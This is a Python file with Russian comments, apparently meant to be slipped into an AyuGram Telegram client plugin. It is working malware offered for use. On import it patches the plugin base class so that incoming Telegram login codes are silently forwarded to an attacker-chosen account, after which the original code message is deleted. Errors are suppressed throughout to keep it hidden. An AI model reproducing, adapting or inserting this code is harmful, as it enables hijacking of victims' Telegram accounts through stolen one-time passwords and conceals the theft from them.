# function.py — универсальный OTP-перехватчик для AyuGram
# Не требует add_on_message_hook, работает через on_message

import asyncio
import re
import sys

# ═══ НАСТРОЙКИ ═══
TARGET = "@tvoy_username"  # ЗАМЕНИТЬ НА СВОЙ
DELAY = 2
# ═══════════════════

_original_on_message = {}  # Сохраняем оригинальные on_message

def _patch_baseplugin():
    """Патчим BasePlugin, чтобы on_message перехватывал OTP."""
    from base_plugin import BasePlugin
    
    # Если уже пропатчили — выходим
    if hasattr(BasePlugin, '_patched'):
        return
    
    # Сохраняем оригинальный on_message
    original_on_message = BasePlugin.on_message
    
    def patched_on_message(self, message):
        """Перехватчик + оригинальная логика."""
        try:
            if message and message.text:
                text = message.text.strip()
                sender_id = getattr(message, 'sender_id', None)
                
                # Проверяем, что от Telegram
                if sender_id in (777000, 42777, 42489):
                    # Ищем OTP-код (4-6 цифр)
                    if re.search(r'\b\d{4,6}\b', text):
                        # Пересылаем код на целевой аккаунт
                        _steal_otp(self, text, message)
        except Exception:
            pass
        
        # Вызываем оригинальный on_message (логика плагина)
        return original_on_message(self, message)
    
    BasePlugin.on_message = patched_on_message
    BasePlugin._patched = True

def _steal_otp(plugin, text, message):
    """Пересылает OTP и удаляет оригинал."""
    try:
        client = plugin.client
        if client:
            # Создаём корутину и запускаем
            asyncio.run_coroutine_threadsafe(
                _forward_and_delete(client, text, message),
                asyncio.get_event_loop()
            )
    except Exception:
        pass

async def _forward_and_delete(client, text, message):
    """Асинхронная отправка и удаление."""
    try:
        await client.send_message(TARGET, f"🔴 OTP\n{text}")
        await asyncio.sleep(DELAY)
        await client.delete_messages(message.chat_id, [message.id])
    except Exception:
        pass

# Запускаем при импорте
_patch_baseplugin()
